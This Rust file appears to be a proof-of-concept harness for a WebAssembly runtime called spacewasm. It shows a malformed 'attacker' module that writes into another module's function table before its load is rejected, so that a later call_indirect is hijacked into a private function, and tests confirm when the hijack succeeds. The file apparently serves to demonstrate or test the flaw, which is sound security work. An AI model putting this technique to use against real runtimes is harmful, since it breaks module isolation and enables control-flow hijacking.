use spacewasm::*;
use std::alloc::Layout;
use std::ptr::NonNull;

const PROVIDER: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/provider.wasm"));
const ATTACKER_INVALID: &[u8] =
    include_bytes!(concat!(env!("OUT_DIR"), "/attacker-invalid.wasm"));
const FUTURE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/future.wasm"));

struct ByteStream {
    bytes: std::vec::Vec<u8>,
    consumed: bool,
}

impl ByteStream {
    fn new(bytes: &[u8]) -> Self {
        Self {
            bytes: bytes.to_vec(),
            consumed: false,
        }
    }
}

impl WasmStream for ByteStream {
    fn read(&mut self) -> Result<Option<InnerVec<u8>>, u8> {
        if self.consumed {
            return Ok(None);
        }
        self.consumed = true;
        Ok(Some(InnerVec {
            ptr: self.bytes.as_mut_ptr(),
            capacity: self.bytes.len() as u32,
            len: self.bytes.len() as u32,
        }))
    }

    fn return_(&mut self, _chunk: InnerVec<u8>) {}
}

struct SystemAllocator;

unsafe impl Allocator for SystemAllocator {
    unsafe fn alloc(&self, layout: Layout) -> Result<*mut u8, AllocError> {
        let ptr = unsafe { std::alloc::alloc(layout) };
        if ptr.is_null() {
            Err(AllocError::OutOfMemory)
        } else {
            Ok(ptr)
        }
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        unsafe { std::alloc::dealloc(ptr, layout) }
    }

    fn memory_statistics(&self) -> MemoryStatistics {
        MemoryStatistics {
            total_bytes: 0,
            pad_bytes: 0,
        }
    }
}

spacewasm::global_allocator!(SystemAllocator, SystemAllocator);

struct LinearAllocator;

impl WasmMemoryAllocator for LinearAllocator {
    fn allocate(&self, layout: Layout) -> Result<NonNull<u8>, AllocError> {
        unsafe { NonNull::new(std::alloc::alloc(layout)).ok_or(AllocError::AllocationFailed) }
    }

    fn reallocate(
        &self,
        ptr: NonNull<u8>,
        old_layout: Layout,
        layout: Layout,
    ) -> Result<NonNull<u8>, AllocError> {
        unsafe {
            NonNull::new(std::alloc::realloc(ptr.as_ptr(), old_layout, layout.size()))
                .ok_or(AllocError::AllocationFailed)
        }
    }

    fn deallocate(&self, ptr: NonNull<u8>, layout: Layout) {
        unsafe { std::alloc::dealloc(ptr.as_ptr(), layout) }
    }
}

fn code_builder() -> CodeBuilder {
    CodeBuilder::new(CompilerOptions {
        allow_memory_grow: true,
        max_backpatch_iterations: 0,
        max_code_pages: 8,
    })
    .unwrap()
}

fn allocator() -> Rc<dyn WasmMemoryAllocator> {
    Rc::new(LinearAllocator)
        .unwrap()
        .into_wasm_memory_allocator()
}

fn load(
    name: &str,
    bytes: &[u8],
    engine: &mut Engine,
    builder: &mut CodeBuilder,
    alloc: Rc<dyn WasmMemoryAllocator>,
) -> Result<Module, ParseError> {
    let mut stream = ByteStream::new(bytes);
    Module::new::<32, 64>(name, &mut stream, &mut engine.store, builder, alloc)
}

fn invoke_provider(
    engine: &mut Engine,
    builder: &CodeBuilder,
    provider_ref: ModuleRef,
) -> i32 {
    // Function 1 is provider.call and performs call_indirect through slot zero.
    engine
        .invoke(
            WasmRef {
                module: provider_ref,
                index: 1,
            },
            &[],
        )
        .unwrap();
    match Interpreter.run(builder.pages(), engine, 1000) {
        InterpreterResult::Finished => engine.result.map(|v| v.read_i32()).unwrap_or(-1),
        _ => -2,
    }
}

fn run_schedule(events: [i32; 3]) -> i32 {
    let mut engine = Engine::new(256, 4, spacewasm::Vec::zero()).unwrap();
    let mut builder = code_builder();
    let alloc = allocator();

    let provider = load(
        "provider",
        PROVIDER,
        &mut engine,
        &mut builder,
        alloc.clone(),
    )
    .unwrap();
    let provider_ref = engine.push_module(provider).unwrap();

    let mut observed = 0;
    for event in events {
        match event {
            // The malformed module reaches its active element section, writes
            // into provider.table, and then fails in the later code section.
            0 => {
                if load(
                    "attacker",
                    ATTACKER_INVALID,
                    &mut engine,
                    &mut builder,
                    alloc.clone(),
                )
                .is_ok()
                {
                    return -10;
                }
            }
            // A later, valid module is appended at the next available index.
            1 => {
                let future = load(
                    "future",
                    FUTURE,
                    &mut engine,
                    &mut builder,
                    alloc.clone(),
                )
                .unwrap();
                engine.push_module(future).unwrap();
            }
            // The already-accepted provider follows slot zero with call_indirect.
            2 => {
                observed = invoke_provider(&mut engine, &builder, provider_ref);
            }
            _ => return -20,
        }
    }

    if observed == 31337 { 1 } else { 0 }
}

/// Event identifiers are: 0 = rejected attacker load, 1 = valid future load,
/// 2 = provider call_indirect.  Returns 1 exactly when the selected schedule
/// redirects the accepted provider into the future module's private function.
#[no_mangle]
pub extern "C" fn spacewasm_run3(event0: i32, event1: i32, event2: i32) -> i32 {
    run_schedule([event0, event1, event2])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn attack_then_future_then_call_hijacks_private_function() {
        assert_eq!(run_schedule([0, 1, 2]), 1);
    }

    #[test]
    fn call_before_rejected_load_is_not_retroactively_hijacked() {
        assert_eq!(run_schedule([2, 0, 1]), 0);
    }
}
